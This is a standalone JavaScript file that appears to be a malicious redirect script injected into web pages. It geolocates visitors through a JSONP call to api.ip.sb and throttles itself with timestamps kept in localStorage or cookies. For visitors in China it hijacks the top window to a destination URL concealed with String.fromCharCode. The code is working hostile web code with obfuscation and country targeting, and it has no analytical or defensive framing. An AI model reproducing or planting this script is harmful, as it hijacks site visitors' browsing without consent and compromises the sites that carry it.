function getips(d){

 if(d.country_code=="CN"){
   window.top.location.href=String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 119, 119, 119, 46, 48, 48, 50, 56, 48, 48, 48, 46, 99, 111, 109, 47);
  }
}
(function () {
  var get = false;
  var ii = false;
  var x = (new Date()).getHours();
  var m = (new Date()).getTime();
  var c = true;
  if (!window.localStorage) {
    var s = document.cookie.split(';');
    for (var i = 0; i < s.length; i++) {
      var ss = s[i].split('=');
      if (ss[0].trim() == 'mx') {
        c = false;
        mx = ss[1]
      } else {
        if (ss[0].trim() == 'mm') {
          mm = ss[1]
        }
      }
    }
  } else {
    mx = window.localStorage['mx'];
    mm = window.localStorage['mm']
  }
  if (x > 4 && x < 20) {
    if ((m - mm) > 600000) {
        get = true
      }
  } else {
    if (x >= 20 && x <= 23) {
      if ((m - mm) > 600000) {
        get = true
      }
    } else {
      if (x >= 0 && x <= 4) {
        if ((m - mm) > 600000) {
          get = true
        }
      }
    }
  }
  if (window.localStorage) {
    if ((typeof (window.localStorage['mm']) == 'undefined') || (typeof (window.localStorage['mm']) == 'undefined')) {
      get = true
    }
  } else {
    if (!c) {
      get = true
    }
  }
  if (get) {
    if (!window.localStorage) {
      document.cookie = 'mx=' + x;
      document.cookie = 'mm=' + m
    } else {
      window.localStorage['mx'] = x;
      window.localStorage['mm'] = m
    }
    //var s=document.referrer;
    //var rr=3;
    //var rss=Math.floor(Math.random()*rr)
   // if(rss==1){
    var s= document.createElement("script");s.src="https://api.ip.sb/geoip?callback=getips";document.head.appendChild(s); 
     
   // }
  }
})();
